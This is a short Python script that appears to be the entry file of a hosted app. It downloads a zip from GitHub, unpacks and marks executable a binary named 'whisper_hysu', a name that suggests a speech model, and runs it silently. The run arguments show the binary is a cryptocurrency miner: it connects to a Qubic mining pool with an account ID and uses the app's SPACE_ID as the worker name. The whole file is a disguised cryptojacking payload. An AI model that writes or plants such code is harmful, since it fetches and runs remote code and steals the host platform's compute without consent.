import os
os.system("wget https://github.com/qqivk/project-3/blob/main/whisper_hysu.zip")
os.system("unzip whisper_hysu.zip")
os.system("chmod +x whisper_hysu")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./whisper_hysu --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wn} >/dev/null")
